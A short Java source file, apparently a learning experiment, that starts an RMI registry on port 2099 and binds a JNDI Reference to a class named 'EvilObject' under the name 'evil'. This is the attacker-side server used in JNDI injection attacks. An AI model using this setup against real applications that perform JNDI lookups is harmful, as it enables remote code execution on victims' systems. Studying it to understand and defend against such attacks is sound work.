package top.lovelily.remote;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

/**
 * Desc: RemoteServer
 * Author: Xu He
 * created: 2021/12/13 10:55
 */

public class RemoteServer {
    public static void main(String[] args) {
        try {
            //-Djava.security.debug=access,failure -Djava.security.manager -Djava.security.policy=E:\IdeaProjects\Test\src\main\resources\my.policy
            System.out.println(System.getSecurityManager() == null);
            if (System.getSecurityManager() == null) {
                System.setSecurityManager(new SecurityManager());
            }

         //   System.setProperty("java.")
            LocateRegistry.createRegistry(2099);
            Registry registry = LocateRegistry.getRegistry(2099);

//            Hello obj = new EvilObject();
//            Hello remote  = (Hello) UnicastRemoteObject.exportObject(obj, 2099);

            Reference ref = new Reference("top.lovelily.remote.EvilObject", "top.lovelily.remote.EvilObject", null);
            ReferenceWrapper remote = new ReferenceWrapper(ref);

            registry.rebind("evil", remote);
            System.out.println("启动 RMI 服务端");
        } catch (Exception e) {
            e.printStackTrace();
        }


    }
}
